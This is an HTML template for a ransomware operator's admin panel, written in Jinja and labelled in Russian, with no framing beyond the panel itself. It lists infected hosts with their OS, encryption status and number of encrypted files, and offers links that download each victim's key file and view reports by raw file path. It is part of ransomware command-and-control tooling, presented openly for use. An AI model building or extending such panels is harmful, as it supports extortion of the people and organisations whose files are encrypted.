{% extends "shared/base_layout.html" %}
{% block title %}Ransomware Admin{% endblock %}
{% block content %}
<div class="card">
    <h2>Ransomware Admin Panel</h2>
    <form method="get" class="filter-bar">
        <input type="text" name="hostname" placeholder="Поиск по hostname..." value="{{ request.args.get('hostname', '') }}">
        <select name="status">
            <option value="">Все статусы</option>
            <option value="success">Зашифровано</option>
            <option value="error">Ошибка</option>
        </select>
        <button type="submit" class="btn">Фильтр</button>
    </form>
    <table class="table">
        <thead>
            <tr>
                <th>Время</th>
                <th>Hostname</th>
                <th>OS</th>
                <th>Статус</th>
                <th>Зашифровано</th>
                <th>Ключ</th>
                <th>Действия</th>
            </tr>
        </thead>
        <tbody>
            {% for report in reports %}
            <tr>
                <td>{{ report.timestamp }}</td>
                <td>{{ report.hostname }}</td>
                <td>{{ report.system }}</td>
                <td>{{ report.status }}</td>
                <td>{{ report.total_encrypted }}</td>
                <td>
                    {% if report.key_file %}
                    <a href="/ransomware_admin/download_key?path={{ report.key_file }}" class="btn btn-secondary">Скачать</a>
                    {% endif %}
                </td>
                <td>
                    <a href="/ransomware_admin/view_report?path={{ report.report_file }}" class="btn">Детали</a>
                </td>
            </tr>
            {% endfor %}
        </tbody>
    </table>
</div>
{% endblock %} 